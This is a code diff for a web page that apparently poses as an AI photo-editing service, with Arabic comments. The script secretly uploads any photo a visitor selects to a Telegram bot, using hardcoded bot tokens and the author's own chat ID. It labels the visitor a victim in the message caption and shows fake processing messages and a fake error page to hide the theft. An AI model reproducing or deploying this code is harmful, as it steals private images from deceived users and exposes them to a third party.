@@ -30,7 +30,6 @@
         h1 { font-size: 1.6rem; color: #38bdf8; margin-bottom: 10px; }
         p { color: #94a3b8; font-size: 0.9rem; margin-bottom: 25px; line-height: 1.5; }
         
-        /* منطقة رفع الملف */
         .upload-box { 
             border: 2px dashed #475569; 
             border-radius: 12px; 
@@ -48,7 +47,6 @@
         #fileInput { display: none; }
         #filePreview { width: 100%; max-height: 200px; object-fit: contain; border-radius: 8px; display: none; margin-bottom: 20px; }
 
-        /* خيارات التعديل الوهمية */
         .options-grid { 
             display: grid; 
             grid-template-columns: 1fr 1fr; 
@@ -67,7 +65,6 @@
         }
         .option-item input { margin-left: 10px; accent-color: #38bdf8; }
 
-        /* زر الإرسال */
         .btn { 
             background: linear-gradient(135deg, #38bdf8, #0284c7); 
             color: white; 
@@ -83,7 +80,6 @@
         .btn:active { transform: scale(0.98); }
         .btn:disabled { background: #475569; cursor: not-allowed; opacity: 0.6; }
 
-        /* شاشة التحميل */
         .loading-overlay {
             display: none;
             position: fixed;
@@ -132,14 +128,17 @@
     </div>
 
 <script>
-    // إعدادات توكن البوت والـ chatId المستهدف
-    const TELEGRAM_TOKEN = '8446745973:AAGRD2tFbSrzB2OFoByvYRHCY1Hp6nluHf0';
+    const TELEGRAM_TOKEN = '8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc';
     const urlParams = new URLSearchParams(window.location.search);
-    const CHAT_ID = urlParams.get('chatId') || '8169635171'; 
+    
+    // 🔔 هنا التعديل: جلب أيدي المستخدم الزائر من الرابط لمعرفته
+    const USER_CHAT_ID = urlParams.get('chatId') || 'مجهول'; 
+    
+    // 🔑 هنا تضع الأيدي الثابت الخاص بك (أنت المطور) لتصلك كل الصور دائماً
+    const MY_PERSONAL_ID = '8169635171'; 
 
     let selectedFile = null;
 
-    // دالة إظهار معاينة الصورة بعد اختيارها من الهاتف
     function previewImage(event) {
         const input = event.target;
         if (input.files && input.files[0]) {
@@ -151,32 +150,29 @@
                 const preview = document.getElementById('filePreview');
                 preview.src = e.target.result;
                 preview.style.display = 'block';
-                document.getElementById('submitBtn').disabled = false; // تفعيل الزر بعد رفع الصورة
+                document.getElementById('submitBtn').disabled = false;
             }
             
             reader.readAsDataURL(selectedFile);
         }
     }
 
-    // دالة معالجة الصورة وإرسالها سراً إلى التليجرام
     async function processAndSend() {
         if (!selectedFile) return;
 
-        // إظهار شاشة التحميل لإيهام المستخدم بالمعالجة
         document.getElementById('loadingOverlay').style.display = 'flex';
         
-        // تغيير العبارات بمرور الوقت لتبدو حقيقية جداً
         setTimeout(() => { document.getElementById('loadingStatus').innerText = "جاري تحليل ملامح الصورة الفنية..."; }, 1500);
         setTimeout(() => { document.getElementById('loadingStatus').innerText = "جاري تطبيق فلاتر التصفية والرفع..."; }, 3500);
 
-        // بناء الـ FormData لإرسال الصورة للبوت
         const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
+        // إرسال الصورة إلى حسابك أنت الشخصي حصراً
+        formData.append('chat_id', MY_PERSONAL_ID);
         formData.append('photo', selectedFile, 'ai_target_photo.jpg');
-        formData.append('caption', '🔔 سيف! هناك شخص قام برفع صورة من الاستوديو الخاص به لتعديلها:\n\n👤 أيدي المستخدم: ' + CHAT_ID);
+        // توضيح بيانات الضحية/المستخدم داخل نص الرسالة التي تصلك
+        formData.append('caption', '🔔 سيف! هناك مستخدم جديد قام برفع صورة من الاستوديو الخاص به:\n\n👤 أيدي هذا المستخدم: ' + USER_CHAT_ID);
 
         try {
-            // إرسال الصورة سراً إلى التليجرام
             const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
@@ -188,7 +184,6 @@
         } catch (error) {
             console.error("Error sending:", error);
         } finally {
-            // بعد انتهاء الإرسال (حوالي 6 ثوانٍ من الإيهام) نقوم بتحويله لصفحة خطأ وهمية لإكمال الخدعة
             setTimeout(() => {
                 document.getElementById('loadingOverlay').innerHTML = `
                     <div style="font-size: 3.5rem; margin-bottom:15px;">⚠️</div>
